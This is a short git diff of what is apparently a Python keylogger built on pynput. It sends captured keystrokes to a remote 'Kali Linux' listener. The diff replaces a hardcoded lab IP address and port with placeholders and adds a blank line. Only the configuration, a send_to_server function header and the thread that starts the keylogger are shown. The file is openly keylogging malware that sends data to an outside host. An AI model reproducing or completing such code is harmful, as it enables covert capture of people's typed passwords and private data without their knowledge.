@@ -3,8 +3,8 @@ import threading
 from pynput import keyboard
 
 # Configure the IP and port of the remote server (Kali Linux)
-SERVER_IP = '192.168.184.131'  # Replace with your Kali Linux machine's IP address
-SERVER_PORT = 9999           # Ensure this port is open and listening on the server
+SERVER_IP = 'xxx.xxx.xxx.xxx'  # Replace with your Kali Linux machine's IP address
+SERVER_PORT = xxxx           # Ensure this port is open and listening on the server
 
 # Function to send data to the server
 def send_to_server(data):
@@ -38,3 +38,4 @@ def start_keylogger():
 if __name__ == "__main__":
     keylogger_thread = threading.Thread(target=start_keylogger)
     keylogger_thread.start()
+
